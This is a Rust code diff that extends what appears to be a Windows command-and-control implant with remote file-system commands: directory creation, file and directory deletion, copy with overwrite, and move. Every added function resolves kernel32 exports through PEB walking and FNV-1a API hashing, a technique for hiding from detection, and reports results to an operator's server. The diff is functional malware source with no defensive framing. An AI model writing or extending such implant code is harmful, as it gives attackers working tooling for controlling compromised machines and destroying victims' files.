@@ -29,6 +29,12 @@ const H_CREATE_FILE_A: u64 = fnv1a64(b"CreateFileA");
 const H_READ_FILE: u64 = fnv1a64(b"ReadFile");
 const H_CLOSE_HANDLE: u64 = fnv1a64(b"CloseHandle");
 const H_GET_LAST_ERROR: u64 = fnv1a64(b"GetLastError");
+const H_CREATE_DIRECTORY_A: u64 = fnv1a64(b"CreateDirectoryA");
+const H_REMOVE_DIRECTORY_A: u64 = fnv1a64(b"RemoveDirectoryA");
+const H_DELETE_FILE_A: u64 = fnv1a64(b"DeleteFileA");
+const H_COPY_FILE_A: u64 = fnv1a64(b"CopyFileA");
+const H_MOVE_FILE_A: u64 = fnv1a64(b"MoveFileA");
+const H_GET_FILE_ATTRIBUTES_A: u64 = fnv1a64(b"GetFileAttributesA");
 
 /// WIN32_FIND_DATAA tail: attributes at +0, ftLastWriteTime at +0x14,
 /// size (high:low) at +0x1C/+0x20, cFileName at +0x2C.
@@ -69,13 +75,16 @@ pub unsafe fn handle(instance: &mut Instance, task: Task, id: u32, results: &mut
         Task::Cd { .. } => cd(kernel32, &task, id, results),
         Task::Ls { .. } => ls(kernel32, &task, id, results),
         Task::Cat { .. } => cat(kernel32, &task, id, results),
+        Task::Mkdir { .. } => mkdir(kernel32, &task, id, results),
+        Task::Rm { .. } => rm(kernel32, &task, id, results),
+        Task::Cp { .. } => copy_move(kernel32, &task, id, results, true),
+        Task::Mv { .. } => copy_move(kernel32, &task, id, results, false),
         Task::Sleep { .. } | Task::Terminate => {}
     }
 }
 
-/// Copy a task path into a NUL-terminated API buffer.
-fn c_path(task: &Task, buf: &mut [u8]) -> Option<usize> {
-    let path = task.path();
+/// Copy raw path bytes into a NUL-terminated API buffer.
+fn c_path_bytes(path: &[u8], buf: &mut [u8]) -> Option<usize> {
     if path.len() + 1 > buf.len() {
         return None;
     }
@@ -86,6 +95,11 @@ fn c_path(task: &Task, buf: &mut [u8]) -> Option<usize> {
     }
     buf[path.len()] = 0;
     Some(path.len())
+}
+
+/// Copy a task's primary path into a NUL-terminated API buffer.
+fn c_path(task: &Task, buf: &mut [u8]) -> Option<usize> {
+    c_path_bytes(task.path(), buf)
 }
 
 unsafe fn pwd(kernel32: *mut c_void, id: u32, results: &mut Writer) {
@@ -295,6 +309,101 @@ unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) 
         }
         i += 1;
     }
+}
+
+unsafe fn mkdir(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
+    let p = peb::find_export(kernel32, H_CREATE_DIRECTORY_A);
+    if p.is_null() {
+        return;
+    }
+    let create = *(p as *const unsafe extern "system" fn(*const u8, *const c_void) -> i32);
+    let mut path = [0u8; 260];
+    if c_path(task, &mut path).is_none() {
+        error(kernel32, id, results);
+        return;
+    }
+    if create(path.as_ptr(), core::ptr::null()) == 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let _ = transport::push_mkdir_result(results, id, task.path());
+}
+
+unsafe fn rm(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) {
+    let attrs = peb::find_export(kernel32, H_GET_FILE_ATTRIBUTES_A);
+    let remove_dir = peb::find_export(kernel32, H_REMOVE_DIRECTORY_A);
+    let delete_file = peb::find_export(kernel32, H_DELETE_FILE_A);
+    if attrs.is_null() || remove_dir.is_null() || delete_file.is_null() {
+        return;
+    }
+    let attrs = *(attrs as *const unsafe extern "system" fn(*const u8) -> u32);
+    let remove_dir = *(remove_dir as *const unsafe extern "system" fn(*const u8) -> i32);
+    let delete_file = *(delete_file as *const unsafe extern "system" fn(*const u8) -> i32);
+    let mut path = [0u8; 260];
+    if c_path(task, &mut path).is_none() {
+        error(kernel32, id, results);
+        return;
+    }
+    // INVALID_FILE_ATTRIBUTES is 0xFFFFFFFF; the directory bit 0x10
+    // decides between RemoveDirectoryA and DeleteFileA — the result
+    // byte tells the server which message to render.
+    let attributes = attrs(path.as_ptr());
+    let is_dir = attributes != 0xFFFF_FFFF && attributes & FILE_ATTRIBUTE_DIRECTORY != 0;
+    let ok = if is_dir {
+        remove_dir(path.as_ptr()) != 0
+    } else {
+        delete_file(path.as_ptr()) != 0
+    };
+    if !ok {
+        error(kernel32, id, results);
+        return;
+    }
+    let _ = transport::push_rm_result(results, id, is_dir);
+}
+
+unsafe fn copy_move(
+    kernel32: *mut c_void,
+    task: &Task,
+    id: u32,
+    results: &mut Writer,
+    is_copy: bool,
+) {
+    let p = if is_copy {
+        peb::find_export(kernel32, H_COPY_FILE_A)
+    } else {
+        peb::find_export(kernel32, H_MOVE_FILE_A)
+    };
+    if p.is_null() {
+        return;
+    }
+    let mut src = [0u8; 260];
+    let mut dst = [0u8; 260];
+    if c_path_bytes(task.path(), &mut src).is_none() {
+        error(kernel32, id, results);
+        return;
+    }
+    if c_path_bytes(task.dst(), &mut dst).is_none() {
+        error(kernel32, id, results);
+        return;
+    }
+    let ok = if is_copy {
+        // bFailIfExists = FALSE: overwrite like the native dialog.
+        let copy = *(p as *const unsafe extern "system" fn(*const u8, *const u8, i32) -> i32);
+        copy(src.as_ptr(), dst.as_ptr(), 0) != 0
+    } else {
+        let mv = *(p as *const unsafe extern "system" fn(*const u8, *const u8) -> i32);
+        mv(src.as_ptr(), dst.as_ptr()) != 0
+    };
+    if !ok {
+        error(kernel32, id, results);
+        return;
+    }
+    let command = if is_copy {
+        transport::COMMAND_COPY
+    } else {
+        transport::COMMAND_MV
+    };
+    let _ = transport::push_plain_result(results, id, command);
 }
 
 unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
